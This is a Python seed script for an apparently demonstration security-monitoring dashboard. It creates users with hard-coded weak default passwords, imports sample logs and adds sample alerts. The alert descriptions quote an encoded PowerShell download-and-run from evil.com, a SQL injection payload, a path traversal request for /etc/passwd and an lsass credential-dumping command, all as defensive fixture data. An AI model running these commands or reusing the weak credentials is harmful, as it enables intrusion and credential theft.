"""
Seed the database with initial data for demonstration.
Run this after the database is initialized.
"""
import os
import sys
import hashlib
from datetime import datetime, timedelta
import random

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app.database import SessionLocal, init_db
from app.auth import get_password_hash
from app.models import User, LogEntry, Alert, Anomaly

def seed_database():
    """Seed database with initial data."""
    print("Seeding database...")
    
    db = SessionLocal()
    
    try:
        # Create admin user
        admin = db.query(User).filter(User.username == "admin").first()
        if not admin:
            admin = User(
                username="admin",
                email="admin@cyberai.local",
                full_name="SOC Administrator",
                hashed_password=get_password_hash("admin123"),
                is_active=True,
                is_admin=True,
                role="admin",
            )
            db.add(admin)
            db.commit()
            print("Created admin user (admin/admin123)")
        
        # Create analyst user
        analyst = db.query(User).filter(User.username == "analyst").first()
        if not analyst:
            analyst = User(
                username="analyst",
                email="analyst@cyberai.local",
                full_name="SOC Analyst",
                hashed_password=get_password_hash("analyst123"),
                is_active=True,
                is_admin=False,
                role="analyst",
            )
            db.add(analyst)
            db.commit()
            print("Created analyst user (analyst/analyst123)")
        
        # Seed sample logs from generated files
        log_count = db.query(LogEntry).count()
        if log_count == 0:
            print("Importing sample logs...")
            
            # Read and parse sample Linux logs
            if os.path.exists("datasets/linux_auth.log"):
                with open("datasets/linux_auth.log", "r") as f:
                    from app.parsers import parse_log, detect_log_type
                    lines = f.readlines()
                    for i, line in enumerate(lines[:100]):  # Import first 100
                        line = line.strip()
                        if not line:
                            continue
                        source_type = detect_log_type(line)
                        parsed = parse_log(line, source_type)
                        
                        log_hash = hashlib.sha256(line.encode()).hexdigest()
                        
                        log_entry = LogEntry(
                            timestamp=parsed.get("timestamp", datetime.utcnow()),
                            source_ip=parsed.get("source_ip"),
                            username=parsed.get("username"),
                            hostname=parsed.get("hostname"),
                            process_name=parsed.get("process_name"),
                            event_type=parsed.get("event_type", source_type),
                            severity=parsed.get("severity", "low"),
                            operating_system=parsed.get("operating_system"),
                            source_type=source_type,
                            source_file="linux_auth.log",
                            raw_log=line,
                            parsed_data=parsed.get("parsed_data"),
                            log_hash=log_hash,
                        )
                        db.add(log_entry)
                        if i % 20 == 0:
                            db.commit()
                db.commit()
                print(f"Imported Linux auth logs")
            
            # Read and parse sample Windows logs
            if os.path.exists("datasets/windows_security.json"):
                import json
                with open("datasets/windows_security.json", "r") as f:
                    from app.parsers import parse_log
                    lines = f.readlines()
                    for i, line in enumerate(lines[:100]):
                        line = line.strip()
                        if not line:
                            continue
                        try:
                            parsed = parse_log(line, "windows_security")
                            log_hash = hashlib.sha256(line.encode()).hexdigest()
                            
                            log_entry = LogEntry(
                                timestamp=parsed.get("timestamp", datetime.utcnow()),
                                source_ip=parsed.get("source_ip"),
                                username=parsed.get("username"),
                                hostname=parsed.get("hostname"),
                                process_name=parsed.get("process_name"),
                                event_id=parsed.get("event_id"),
                                event_type=parsed.get("event_type", "windows_security"),
                                severity=parsed.get("severity", "low"),
                                operating_system="windows",
                                source_type="windows_security",
                                source_file="windows_security.json",
                                raw_log=line,
                                parsed_data=parsed.get("parsed_data") if isinstance(parsed.get("parsed_data"), dict) else {},
                                log_hash=log_hash,
                            )
                            db.add(log_entry)
                            if i % 20 == 0:
                                db.commit()
                        except Exception as e:
                            continue
                db.commit()
                print(f"Imported Windows security logs")
            
            # Read and parse sample Web logs
            if os.path.exists("datasets/apache_access.log"):
                with open("datasets/apache_access.log", "r") as f:
                    from app.parsers import parse_log
                    lines = f.readlines()
                    for i, line in enumerate(lines[:100]):
                        line = line.strip()
                        if not line:
                            continue
                        parsed = parse_log(line, "apache_access")
                        log_hash = hashlib.sha256(line.encode()).hexdigest()
                        
                        log_entry = LogEntry(
                            timestamp=parsed.get("timestamp", datetime.utcnow()),
                            source_ip=parsed.get("source_ip"),
                            request_method=parsed.get("request_method"),
                            endpoint=parsed.get("endpoint"),
                            status_code=parsed.get("status_code"),
                            event_type=parsed.get("event_type", "web_request"),
                            severity=parsed.get("severity", "low"),
                            source_type="apache_access",
                            source_file="apache_access.log",
                            raw_log=line,
                            parsed_data=parsed.get("parsed_data") if isinstance(parsed.get("parsed_data"), dict) else {},
                            log_hash=log_hash,
                        )
                        db.add(log_entry)
                        if i % 20 == 0:
                            db.commit()
                db.commit()
                print(f"Imported Apache access logs")
        
        # Seed sample alerts
        alert_count = db.query(Alert).count()
        if alert_count == 0:
            print("Creating sample alerts...")
            
            sample_alerts = [
                {
                    "alert_id": "ALERT-000001",
                    "severity": "critical",
                    "attack_type": "SSH Brute Force Attack",
                    "source_ip": "192.168.1.45",
                    "affected_system": "server-01",
                    "description": "Detected SSH brute force attack from 192.168.1.45 with 27 failed login attempts targeting user 'root'",
                    "recommendation": "Block the source IP immediately. Review account lockout policies. Consider implementing multi-factor authentication.",
                    "status": "new",
                    "mitre_tactic": "Credential Access",
                    "mitre_technique": "Brute Force",
                    "mitre_technique_id": "T1110",
                    "risk_score": 92.5,
                    "confidence": 0.95,
                },
                {
                    "alert_id": "ALERT-000002",
                    "severity": "critical",
                    "attack_type": "SQL Injection Attempt",
                    "source_ip": "203.0.113.78",
                    "affected_system": "web-server-02",
                    "description": "SQL injection payload detected in request: UNION SELECT * FROM users--",
                    "recommendation": "Block the source IP. Review WAF rules. Patch vulnerable applications. Monitor for successful exploitation.",
                    "status": "acknowledged",
                    "mitre_tactic": "Initial Access",
                    "mitre_technique": "Exploit Public-Facing Application",
                    "mitre_technique_id": "T1190",
                    "risk_score": 88.0,
                    "confidence": 0.9,
                },
                {
                    "alert_id": "ALERT-000003",
                    "severity": "high",
                    "attack_type": "Suspicious PowerShell Execution",
                    "source_ip": "10.0.0.15",
                    "affected_system": "WORKSTATION05",
                    "description": "Encoded PowerShell command detected: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==",
                    "recommendation": "Isolate the affected system. Kill suspicious processes. Run full malware scan.",
                    "status": "new",
                    "mitre_tactic": "Execution",
                    "mitre_technique": "Command and Scripting Interpreter",
                    "mitre_technique_id": "T1059.001",
                    "risk_score": 78.5,
                    "confidence": 0.92,
                },
                {
                    "alert_id": "ALERT-000004",
                    "severity": "high",
                    "attack_type": "RDP Brute Force",
                    "source_ip": "198.51.100.22",
                    "affected_system": "TERMINALSRV01",
                    "description": "Multiple failed RDP login attempts (15) from 198.51.100.22",
                    "recommendation": "Block the source IP. Enable Network Level Authentication. Consider using VPN for remote access.",
                    "status": "resolved",
                    "mitre_tactic": "Initial Access",
                    "mitre_technique": "External Remote Services",
                    "mitre_technique_id": "T1133",
                    "risk_score": 72.0,
                    "confidence": 0.85,
                },
                {
                    "alert_id": "ALERT-000005",
                    "severity": "medium",
                    "attack_type": "Path Traversal Attempt",
                    "source_ip": "203.0.113.91",
                    "affected_system": "web-server-01",
                    "description": "Directory traversal attack detected: GET /../../../etc/passwd HTTP/1.1",
                    "recommendation": "Block the source IP. Review input validation. Update WAF rules.",
                    "status": "new",
                    "mitre_tactic": "Initial Access",
                    "mitre_technique": "Exploit Public-Facing Application",
                    "mitre_technique_id": "T1190",
                    "risk_score": 55.0,
                    "confidence": 0.8,
                },
                {
                    "alert_id": "ALERT-000006",
                    "severity": "high",
                    "attack_type": "Credential Dumping Indicator",
                    "source_ip": "10.0.0.25",
                    "affected_system": "DC01",
                    "description": "Possible credential dumping activity: procdump.exe -accepteula -ma lsass.exe",
                    "recommendation": "Isolate the affected system. Force password reset for affected accounts. Enable credential guard.",
                    "status": "acknowledged",
                    "mitre_tactic": "Credential Access",
                    "mitre_technique": "OS Credential Dumping",
                    "mitre_technique_id": "T1003",
                    "risk_score": 85.0,
                    "confidence": 0.88,
                },
                {
                    "alert_id": "ALERT-000007",
                    "severity": "medium",
                    "attack_type": "Web Scanning Activity",
                    "source_ip": "185.220.101.42",
                    "affected_system": "web-server-02",
                    "description": "Automated scanning detected: 45 requests for non-existent paths in 2 minutes",
                    "recommendation": "Monitor the source IP. Review firewall rules. Consider blocking if persistent.",
                    "status": "false_positive",
                    "mitre_tactic": "Reconnaissance",
                    "mitre_technique": "Active Scanning",
                    "mitre_technique_id": "T1046",
                    "risk_score": 42.0,
                    "confidence": 0.7,
                },
                {
                    "alert_id": "ALERT-000008",
                    "severity": "critical",
                    "attack_type": "Suspicious Service Installation",
                    "source_ip": "10.0.0.30",
                    "affected_system": "SERVER03",
                    "description": "Suspicious service installed: WindowsUpdate (ImagePath: C:\Windows\Temp\svchost.exe)",
                    "recommendation": "Remove the service immediately. Scan for malware. Review service configurations.",
                    "status": "new",
                    "mitre_tactic": "Persistence",
                    "mitre_technique": "Create or Modify System Process",
                    "mitre_technique_id": "T1543.003",
                    "risk_score": 90.0,
                    "confidence": 0.93,
                },
            ]
            
            for alert_data in sample_alerts:
                alert = Alert(
                    alert_id=alert_data["alert_id"],
                    timestamp=datetime.utcnow() - timedelta(hours=random.randint(1, 48)),
                    severity=alert_data["severity"],
                    attack_type=alert_data["attack_type"],
                    source_ip=alert_data["source_ip"],
                    affected_system=alert_data["affected_system"],
                    description=alert_data["description"],
                    recommendation=alert_data["recommendation"],
                    status=alert_data["status"],
                    mitre_tactic=alert_data["mitre_tactic"],
                    mitre_technique=alert_data["mitre_technique"],
                    mitre_technique_id=alert_data["mitre_technique_id"],
                    risk_score=alert_data["risk_score"],
                    confidence=alert_data["confidence"],
                )
                db.add(alert)
            
            db.commit()
            print(f"Created {len(sample_alerts)} sample alerts")
        
        print("Database seeded successfully!")
        print("\nDefault credentials:")
        print("  Admin:    admin / admin123")
        print("  Analyst:  analyst / analyst123")
    
    except Exception as e:
        db.rollback()
        print(f"Error seeding database: {e}")
        raise
    finally:
        db.close()


if __name__ == "__main__":
    init_db()
    seed_database()
